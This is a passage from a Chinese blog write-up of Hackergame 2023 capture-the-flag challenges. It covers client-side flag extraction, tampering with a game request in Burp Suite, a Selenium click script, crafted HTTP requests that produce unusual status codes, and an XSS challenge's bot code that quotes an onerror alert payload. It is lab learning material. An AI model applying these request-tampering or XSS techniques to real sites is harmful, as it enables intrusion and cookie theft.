  <span class="token keyword">const</span> data1 <span class="token operator">=</span> imageData1<span class="token punctuation">.</span>data<span class="token punctuation">;</span>
  <span class="token keyword">const</span> data2 <span class="token operator">=</span> imageData2<span class="token punctuation">.</span>data<span class="token punctuation">;</span>
  <span class="token keyword">const</span> len <span class="token operator">=</span> data1<span class="token punctuation">.</span>length<span class="token punctuation">;</span>
  <span class="token keyword">let</span> diff <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> len<span class="token punctuation">;</span> i <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    diff <span class="token operator">+=</span> Math<span class="token punctuation">.</span><span class="token function">abs</span><span class="token punctuation">(</span>data1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> data2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">255</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">return</span> <span class="token number">1</span> <span class="token operator">-</span> diff <span class="token operator">/</span> <span class="token punctuation">(</span>len <span class="token operator">/</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">const</span> <span class="token function-variable function">getCurrentSimilarity</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">const</span> c1 <span class="token operator">=</span> <span class="token function">getCanvasByContainer</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'#ref-wave'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">const</span> c2 <span class="token operator">=</span> <span class="token function">getCanvasByContainer</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'#record-wave'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span>c1 <span class="token operator">===</span> <span class="token keyword">null</span> <span class="token operator">||</span> c2 <span class="token operator">===</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>

  <span class="token keyword">const</span> imageData1 <span class="token operator">=</span> <span class="token function">getImageData</span><span class="token punctuation">(</span>c1<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">const</span> imageData2 <span class="token operator">=</span> <span class="token function">getImageData</span><span class="token punctuation">(</span>c2<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">const</span> similarity <span class="token operator">=</span> <span class="token function">computeSimilarity</span><span class="token punctuation">(</span>imageData1<span class="token punctuation">,</span> imageData2<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> similarity<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>看来相似度100就能得到flag，直接传参值为100，hackergame，启动！</p>
<p>yysy原神启动的效果还真给他做出来了（</p>
<p><img src="/blog/2023/11/03/Hackergame-2023/image-20231103221444869.png" alt="image-20231103221444869"></p>
<hr>
<h2 id="更深更暗"><a href="#更深更暗" class="headerlink" title="更深更暗"></a>更深更暗</h2><blockquote>
<p>js控制台使用</p>
</blockquote>
<p>f12打开调试器，在main.js找到获得flag的函数</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token parameter">token</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// Generate the flag based on user's token</span>
        <span class="token keyword">let</span> hash <span class="token operator">=</span> CryptoJS<span class="token punctuation">.</span><span class="token constant">SHA256</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">dEEper_@nd_d@rKer_</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>token<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">flag&#123;T1t@n_</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>hash<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">&#125;</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>然后在控制台调用异步函数</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token string">"my_token"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">result</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token parameter">error</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这样就能得到flag</p>
<hr>
<h2 id="赛博井字棋"><a href="#赛博井字棋" class="headerlink" title="赛博井字棋"></a>赛博井字棋</h2><blockquote>
<p>burpsuite抓包</p>
</blockquote>
<p>下棋的过程中发现我们每下一步都会向服务器发送一次请求</p>
<p><img src="/blog/2023/11/03/Hackergame-2023/image-20231103224716159.png" alt="image-20231103224716159"></p>
<p>猜测可以通过抓包修改位置的方式把ai下的棋覆盖成自己的棋</p>
<p>那么我们先下一步在(1,1)，此时ai下在了(0,0)，然后再下下一步的时候进行抓包</p>
<p><img src="/blog/2023/11/03/Hackergame-2023/image-20231103224942474.png" alt="image-20231103224942474"></p>
<p>改为(0,0)，发包</p>
<p><img src="/blog/2023/11/03/Hackergame-2023/image-20231103225037117.png" alt="image-20231103225037117"></p>
<p>此时胜利的法则已然决定（</p>
<p>flag：<code>flag&#123;I_can_eat_your_pieces_b4dca6cf72&#125;</code></p>
<hr>
<h2 id="组委会模拟器"><a href="#组委会模拟器" class="headerlink" title="组委会模拟器"></a>组委会模拟器</h2><blockquote>
<p>python脚本模拟点击</p>
</blockquote>
<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">每年比赛，组委会的一项重要工作就是时刻盯着群，并且撤回其中有 flag 的消息。今年因为人手紧张，组委会的某名同学将这项工作外包给了你，你需要连续审查 1000 条消息，准确无误地撤回其中所有含 flag 的消息，并且不撤回任何不含 flag 的消息。

本题中，你需要撤回的 "flag" 的格式为 hack[...]，其中方括号内均为小写英文字母，点击消息即可撤回。你需要在 3 秒内撤回消息，否则撤回操作将失败。在全部消息显示完成后等待几秒，如果你撤回的消息完全正确（撤回了全部需要撤回的消息，并且未将不需要撤回的消息撤回），就能获得本题真正的 flag。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>既然要点击才能撤回，那就要用到selenium来模拟</p>
<p>让gpt帮我写了个脚本点击</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> selenium <span class="token keyword">import</span> webdriver
<span class="token keyword">from</span> selenium<span class="token punctuation">.</span>webdriver<span class="token punctuation">.</span>common<span class="token punctuation">.</span>by <span class="token keyword">import</span> By

<span class="token comment"># 创建Firefox浏览器的WebDriver实例</span>
driver <span class="token operator">=</span> webdriver<span class="token punctuation">.</span>Firefox<span class="token punctuation">(</span><span class="token punctuation">)</span>

driver<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"http://202.38.93.111:10021/api/checkToken?token=3854%3AMEUCIQC%2F%2F2P%2FAltLuae%2Bobq6027zxeJwjaD6VvVEo0djWN0f9AIgMr8lZglJH5DCXqADwcmR83KXkDIjzPKLW876k0PamA0%3D"</span><span class="token punctuation">)</span>  <span class="token comment"># 替换为要操作的网页URL</span>

<span class="token comment"># 循环执行1000次</span>
<span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># 导航到网页</span>
    <span class="token comment"># 查找包含字符串"hack"的元素</span>
    elements <span class="token operator">=</span> driver<span class="token punctuation">.</span>find_elements<span class="token punctuation">(</span>By<span class="token punctuation">.</span>XPATH<span class="token punctuation">,</span> <span class="token string">"//*[contains(text(), 'hack[')]"</span><span class="token punctuation">)</span>

    <span class="token comment"># 如果找到了元素，则模拟点击第一个匹配的元素</span>
    <span class="token keyword">if</span> elements<span class="token punctuation">:</span>
        element <span class="token operator">=</span> elements<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
        element<span class="token punctuation">.</span>click<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<h2 id="HTTP-集邮册（复现）"><a href="#HTTP-集邮册（复现）" class="headerlink" title="HTTP 集邮册（复现）"></a>HTTP 集邮册（复现）</h2><h3 id="收集状态码"><a href="#收集状态码" class="headerlink" title="收集状态码"></a>收集状态码</h3><p>正常访问返回200</p>
<p>删掉Host内的主机地址返回400</p>
<p>访问一个不存在的文件返回404</p>
<p>单独把请求方式改为PUT返回405（方法不允许）</p>
<p>单独修改HTTP协议为HTTP&#x2F;2返回505</p>
<p>接下来是需要看文档的部分：</p>
<ul>
<li><p>100 Continue. 代表服务器希望客户端继续请求或者忽略。需要客户端发送 <code>Expect: 100-continue</code>。</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/</span> <span class="token http-version property">HTTP/1.1</span></span>\r\n
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">example.com\r\n</span></span>
<span class="token header"><span class="token header-name keyword">Expect</span><span class="token punctuation">:</span> <span class="token header-value">100-continue\r\n\r\n</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
</li>
<li><p>206 Partial Content. 一个 HTTP 请求可以只请求部分内容，服务器也会返回部分内容。</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/</span> <span class="token http-version property">HTTP/1.1</span></span>\r\n
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">example.com\r\n</span></span>
<span class="token header"><span class="token header-name keyword">Range</span><span class="token punctuation">:</span> <span class="token header-value">bytes=1-2\r\n\r\n</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
</li>
<li><p>416 Range Not Satisfiable. 上面的 <code>Range</code> 是一个合法的范围，那么不合法的范围呢？就是 416。</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/</span> <span class="token http-version property">HTTP/1.1</span></span>\r\n
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">example.com\r\n</span></span>
<span class="token header"><span class="token header-name keyword">Range</span><span class="token punctuation">:</span> <span class="token header-value">bytes=114514-1919810\r\n\r\n</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
</li>
<li><p>304 Not Modified. 代表文件在指定条件下没有修改过，这里用 <code>If-Modified-Since</code>：</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/</span> <span class="token http-version property">HTTP/1.1</span></span>\r\n
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">example.com\r\n</span></span>
<span class="token header"><span class="token header-name keyword">If-Modified-Since</span><span class="token punctuation">:</span> <span class="token header-value">Tue, 15 Aug 2023 17:03:04 GMT\r\n\r\n</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
</li>
<li><p>412 Precondition Failed. 这个 payload 使用了 ETag + If-Match，ETag 和对应的 web 资源对应，用来区分对应资源不同的版本。客户端可以利用这个信息来节省带宽。这里 <a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/If-Match"><code>If-Match</code></a> 则在尝试匹配这个 ETag，如果不匹配，那就返回 412。</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/</span> <span class="token http-version property">HTTP/1.1</span></span>\r\n
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">example.com\r\n</span></span>
<span class="token header"><span class="token header-name keyword">If-Match</span><span class="token punctuation">:</span> <span class="token header-value">"bfc13a64729c4290ef5b2c2730249c88ca92d82d"\r\n\r\n</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
</li>
<li><p>413 Content Too Large. 不需要真正输入很大的 payload，把 <code>Content-length</code> 弄得很大就行：</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/</span> <span class="token http-version property">HTTP/1.1</span></span>\r\n
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">example.com\r\n</span></span>
<span class="token header"><span class="token header-name keyword">Content-length</span><span class="token punctuation">:</span> <span class="token header-value">1145141919810\r\n\r\n</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
</li>
<li><p>414 URI Too Long. 大概需要很长的 URI 路径（但是又不能太长，否则 web 界面本体不会允许这样的响应）。内容详见 [414.txt](<a target="_blank" rel="noopener" href="https://github.com/USTC-Hackergame/hackergame2023-writeups/blob/master/official/HTTP">https://github.com/USTC-Hackergame/hackergame2023-writeups/blob/master/official/HTTP</a> 集邮册&#x2F;414.txt)。</p>
</li>
<li><p>501 Not Implemented. 代表服务器不支持此功能</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/</span> <span class="token http-version property">HTTP/1.1</span></span>\r\n
<span class="token header"><span class="token header-name keyword">Transfer-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip\r\n</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">example.com\r\n\r\n</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><code>gzip</code> 换成除了 <code>chunked</code> 以外的任意字符串都行</p>
</li>
</ul>
<h3 id="无状态码"><a href="#无状态码" class="headerlink" title="无状态码"></a>无状态码</h3><p>和gpt聊的时候知道有HTTP&#x2F;0.9的请求可以返回无状态码，但是不能直接修改成HTTP&#x2F;0.9</p>
<p>它只支持 <code>GET</code>，然后后面直接接 URL</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http">GET /\r\n<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<hr>
<h2 id="微积分计算小练习-2-0（复现）"><a href="#微积分计算小练习-2-0（复现）" class="headerlink" title="微积分计算小练习 2.0（复现）"></a>微积分计算小练习 2.0（复现）</h2><blockquote>
<p>xss</p>
</blockquote>
<p>题目描述：</p>
<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">题目更难，很难手算答对；
支持做完题目之后给小 X 留言，感谢您宝贵的时间——对了，小 X 特地添加了字符黑名单——毕竟正常人怎么可能起 &lt;img src=a onerror="alert(1)"> 这种名字嘛！留言的长度也做了限制，这样就算能 XSS，也只能弹个框，大概没啥实际危害吧。
不再需要手动提交成绩，而且小 X 决定，在这个什么比赛结束之前，他绝对不会再去打开留言页面了——只要不去看，就不会被 XSS（大概）！但是小 X 在网上冲浪的时候，还是会忍不住看其他同学写的网页——不过应该不会出问题吧，至少小 X 本人是这么想的。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>hint：</p>
<ol>
<li><strong>题目环境不与互联网连接</strong>；</li>
<li>目前主流的浏览器都不允许随意弹出窗口（popup），但是小 X 是一个很好说话的人，随便找个理由他就会允许你弹窗了；而这里这个 bot 甚至不需要理由，就会来查看你的弹窗（如果有）；</li>
<li>flag 可能会有点长。</li>
</ol>
<p>下载附件，是bot的代码</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># Copyright 2022-2023 USTC-Hackergame</span>
<span class="token comment"># Copyright 2021 PKU-GeekGame</span>
<span class="token comment">#</span>
<span class="token comment"># Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:</span>
<span class="token comment">#</span>
<span class="token comment"># 1. Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.</span>
<span class="token comment">#</span>
<span class="token comment"># 2. Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution.</span>
<span class="token comment">#</span>
<span class="token comment"># 3. Neither the name of the copyright holder nor the names of its contributors may be used to endorse or promote products derived from this software without specific prior written permission.</span>
<span class="token comment">#</span>
<span class="token comment"># THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.</span>

<span class="token keyword">from</span> selenium <span class="token keyword">import</span> webdriver
<span class="token keyword">import</span> selenium
<span class="token keyword">import</span> time
<span class="token keyword">import</span> os
<span class="token keyword">import</span> subprocess
<span class="token keyword">import</span> urllib<span class="token punctuation">.</span>parse

<span class="token comment"># secret.py 不提供</span>
<span class="token keyword">from</span> secret <span class="token keyword">import</span> FLAG<span class="token punctuation">,</span> BOT_SECRET

os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span><span class="token string">"/dev/shm/xss-data"</span><span class="token punctuation">)</span>
os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span><span class="token string">"/dev/shm/chromium-data"</span><span class="token punctuation">)</span>
FLAG <span class="token operator">=</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>quote_plus<span class="token punctuation">(</span>FLAG<span class="token punctuation">)</span>
<span class="token comment"># 环境变量 "hackergame_token" 是你的 token</span>
<span class="token builtin">id</span> <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>environ<span class="token punctuation">[</span><span class="token string">"hackergame_token"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token comment"># Stage 1</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"请输入你的 HTML 文件，以仅包含 EOF 三个字母的行结束，该文件需要小于 5KiB。"</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"我会在本地启动一个静态的 HTTP 服务器提供这个文件。"</span><span class="token punctuation">)</span>

code <span class="token operator">=</span> <span class="token string">""</span>
<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    line <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> line <span class="token operator">==</span> <span class="token string">"EOF"</span><span class="token punctuation">:</span>
        <span class="token keyword">break</span>
    code <span class="token operator">+=</span> line <span class="token operator">+</span> <span class="token string">"\n"</span>
    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">5</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"你的 HTML 太大了，尝试短一些吧！"</span><span class="token punctuation">)</span>
        exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/dev/shm/xss-data/index.html"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>code<span class="token punctuation">)</span>
sp <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>Popen<span class="token punctuation">(</span>
    <span class="token punctuation">[</span><span class="token string">"python3"</span><span class="token punctuation">,</span> <span class="token string">"-m"</span><span class="token punctuation">,</span> <span class="token string">"http.server"</span><span class="token punctuation">,</span> <span class="token string">"-b"</span><span class="token punctuation">,</span> <span class="token string">"127.0.0.1"</span><span class="token punctuation">,</span> <span class="token string">"10240"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> cwd<span class="token operator">=</span><span class="token string">"/dev/shm/xss-data"</span><span class="token punctuation">,</span>
    stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>DEVNULL<span class="token punctuation">,</span> stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>DEVNULL
<span class="token punctuation">)</span>
time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
<span class="token keyword">if</span> sp<span class="token punctuation">.</span>poll<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"启动 HTTP 服务器失败，请联系管理员。"</span><span class="token punctuation">)</span>
    exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

<span class="token comment"># BOT 用 "BOT_SECRET" 以「管理员权限」登录，然后降权到和你一样</span>
LOGIN_URL <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"http://web/?bot=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>BOT_SECRET<span class="token punctuation">&#125;</span></span><span class="token string">&amp;id=</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">id</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>
<span class="token comment"># 在题目服务器上，bot 会访问 http://web</span>
<span class="token comment"># 本地调试时，需要做如下修改：</span>
<span class="token comment"># LOGIN_URL = "http://题目地址/?token=your_token"</span>


<span class="token comment"># Stage 2</span>
<span class="token keyword">try</span><span class="token punctuation">:</span>
    options <span class="token operator">=</span> webdriver<span class="token punctuation">.</span>ChromeOptions<span class="token punctuation">(</span><span class="token punctuation">)</span>
    options<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">"--no-sandbox"</span><span class="token punctuation">)</span>  <span class="token comment"># sandbox not working in docker</span>
    options<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">"--headless"</span><span class="token punctuation">)</span>
    options<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">"--disable-gpu"</span><span class="token punctuation">)</span>
    options<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">"--user-data-dir=/dev/shm/user-data"</span><span class="token punctuation">)</span>
    os<span class="token punctuation">.</span>environ<span class="token punctuation">[</span><span class="token string">"TMPDIR"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"/dev/shm/chromium-data/"</span>
    options<span class="token punctuation">.</span>add_experimental_option<span class="token punctuation">(</span><span class="token string">"excludeSwitches"</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"enable-logging"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

    <span class="token keyword">with</span> webdriver<span class="token punctuation">.</span>Chrome<span class="token punctuation">(</span>options<span class="token operator">=</span>options<span class="token punctuation">)</span> <span class="token keyword">as</span> driver<span class="token punctuation">:</span>
        ua <span class="token operator">=</span> driver<span class="token punctuation">.</span>execute_script<span class="token punctuation">(</span><span class="token string">"return navigator.userAgent"</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">" I am using"</span><span class="token punctuation">,</span> ua<span class="token punctuation">)</span>

        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"- Logining..."</span><span class="token punctuation">)</span>
        driver<span class="token punctuation">.</span>get<span class="token punctuation">(</span>LOGIN_URL<span class="token punctuation">)</span>
        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>

        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">" Putting secret flag..."</span><span class="token punctuation">)</span>
        driver<span class="token punctuation">.</span>execute_script<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'document.cookie="flag=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>FLAG<span class="token punctuation">&#125;</span></span><span class="token string">"'</span></span><span class="token punctuation">)</span>
        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"- Now browsing your website..."</span><span class="token punctuation">)</span>
        driver<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"http://localhost:10240"</span><span class="token punctuation">)</span>
        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>

        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Bye bye!"</span><span class="token punctuation">)</span>
<span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ERROR"</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">)</span>
